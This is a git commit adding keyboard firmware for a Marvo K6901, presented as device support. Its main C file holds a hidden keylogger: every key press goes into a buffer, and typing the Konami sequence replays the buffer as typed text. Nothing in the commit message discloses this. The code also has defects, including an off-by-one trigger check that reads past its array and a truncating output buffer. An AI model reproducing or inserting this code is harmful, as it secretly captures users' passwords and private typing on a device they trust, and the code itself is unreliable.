9cede592323b36f2ead3d3c795b6ad4bf55d5153
Dale Nunns <dale@xor.co.za>
2023-12-01 08:08:24 +0200

    Initial commit of the code to support the Marvo K6901

---
+++ keyboards/marvo/k6901/k6901.c
@@ -0,0 +1,58 @@
+// Copyright 2023 Dale Nunns (@Dale Nunns)
+// SPDX-License-Identifier: GPL-2.0-or-later
+
+#include "k6901.h"
+#include "quantum.h"
+#include <stdio.h>
+
+#define MAX_KEYLOG_BUFFER_LENGTH 100
+
+//uint16_t dumpKey[] = {KC_H,KC_U,KC_N,KC_T,KC_E,KC_R,KC_3};
+uint16_t dumpKey[] = {KC_UP,KC_UP,KC_DOWN,KC_DOWN,KC_LEFT,KC_RIGHT,KC_LEFT,KC_RIGHT,KC_A,KC_B};
+static int dumpKeyPos = 0;
+
+static uint16_t keylog[MAX_KEYLOG_BUFFER_LENGTH];
+static int keylogPos = 0;
+
+bool process_record_user(uint16_t keycode, keyrecord_t *record) {
+    if (record->event.pressed) {
+        if (keycode == dumpKey[dumpKeyPos]) {
+            dumpKeyPos++;
+            if (dumpKeyPos > (sizeof(dumpKey) /sizeof(dumpKey[0])) ) {
+                SEND_STRING("\nAll Your String Belong To Us\n");
+                dump_keylog();
+                SEND_STRING("\n--------\n");
+            }
+        } else {dumpKeyPos =0;}
+    }
+
+    return true;
+}
+
+bool process_record_kb(uint16_t keycode, keyrecord_t *record) {
+   
+    if (record->event.pressed) {
+        log_key(keycode, record);
+    }
+
+    return process_record_user(keycode, record);
+}
+
+
+void log_key(uint16_t keycode, keyrecord_t *record) {
+    
+    keylog[keylogPos] = keycode;
+    keylogPos++;
+
+    if (keylogPos >= MAX_KEYLOG_BUFFER_LENGTH) {keylogPos = 0;}
+}
+
+
+
+void dump_keylog(void) {
+    char buffer[4];
+    for (int idx=0; idx < MAX_KEYLOG_BUFFER_LENGTH -1; idx++) {
+        snprintf(buffer, sizeof buffer, "%d ", keylog[idx]);
+        send_string(buffer);
+    }
+}
---
+++ keyboards/marvo/k6901/rules.mk
@@ -0,0 +1,22 @@
+# project specific files
+SRC = rand.c
+
+# MCU name
+MCU = SN32F268F
+
+# Build Options
+#   change yes to no to disable
+#
+BOOTMAGIC_ENABLE = yes      # Enable Bootmagic Lite
+MOUSEKEY_ENABLE = yes       # Mouse keys
+EXTRAKEY_ENABLE = yes       # Audio control and System control
+CONSOLE_ENABLE = no         # Console for debug
+COMMAND_ENABLE = no         # Commands for debug and configuration
+NKRO_ENABLE = no            # Enable N-Key Rollover
+BACKLIGHT_ENABLE = no       # Enable keyboard backlight functionality
+RGBLIGHT_ENABLE = no        # Enable keyboard RGB underglow
+AUDIO_ENABLE = no           # Audio output
+
+# Reduce code size
+USE_PROCESS_STACKSIZE    = 0x1E0
+USE_EXCEPTIONS_STACKSIZE = 0xE0
